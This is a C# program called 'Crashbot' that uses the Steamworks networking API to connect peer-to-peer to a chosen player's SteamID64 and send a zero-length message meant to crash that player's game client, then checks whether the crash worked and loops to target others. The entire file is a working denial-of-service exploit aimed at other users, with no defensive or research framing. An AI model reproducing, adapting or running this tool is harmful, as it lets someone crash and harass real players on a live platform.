using Newtonsoft.Json;
using Steamworks;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using static SteamKit2.GC.Dota.Internal.CMsgDOTALeague;

namespace Crashbot
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Crashbot");
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            Console.WriteLine(Environment.CurrentDirectory);
            File.WriteAllText("steam_appid.txt", "387990");


            if (!Steamworks.SteamAPI.Init())
            {
                Debug.WriteLine("SteamAPI.Init() failed!");
                return;
            }
            else
            {
                Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
                Console.WriteLine("SteamID: " + Steamworks.SteamUser.GetSteamID());
            }

            Console.WriteLine("76561198299556567");

            start:

            Console.Write("Enter target SteamID64: ");
            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");

            var steamuser = new SteamKit2.SteamID(target);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());
            Console.WriteLine($"Targeting [{cSteamID.m_SteamID}]");

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);

            Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());

            var res = Steamworks.SteamNetworkingSockets.InitAuthentication();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamAPI.RunCallbacks();

            Steamworks.SteamNetworkingSockets.GetAuthenticationStatus(out Steamworks.SteamNetAuthenticationStatus_t status);
            while (status.m_eAvail != ESteamNetworkingAvailability.k_ESteamNetworkingAvailability_Current)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                Steamworks.SteamNetworkingSockets.GetAuthenticationStatus(out status);
                Thread.Sleep(10);
            }

            Console.WriteLine("m_eAvail: " + status.m_eAvail);

            bool state = false;
            HSteamNetConnection? conn = null;

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            conn = Steamworks.SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 0, []);
            Console.WriteLine("Init connection...");

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out Steamworks.SteamNetConnectionInfo_t info);
            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out info);
                Thread.Sleep(10);
            }

            Console.WriteLine("Connected!");

            int maxMessages = 1;
            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(conn.Value, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn.Value, 0, 0, 0, out long messageID);
                    Console.WriteLine("Crashing client...");
                    break;
                }
                else
                {
                    // No messages received - you can add a sleep here to reduce CPU usage
                    Thread.Sleep(10); // Sleep for 10 milliseconds
                }
            }

            // confirm crashed
            const int desiredTimeoutValue = 300;
            // Create an array of connection parameters (config values)
            SteamNetworkingConfigValue_t[] connectionParams = new SteamNetworkingConfigValue_t[1];

            // Set the timeout option
            connectionParams[0].m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial;
            connectionParams[0].m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = desiredTimeoutValue };

            // The desiredTimeoutValue is in milliseconds. Set this to the timeout you want.

            // Start the connection attempt
            conn = Steamworks.SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 0, connectionParams);

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out info);
            while (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connecting)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out info);
            }

            Console.WriteLine(info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected ? "Failed to Crash" : "Successfully Crashed!");

            Steamworks.SteamNetworkingSockets.CloseConnection(conn.Value, 0, "\0", false);

            goto start;
        }
    }
}
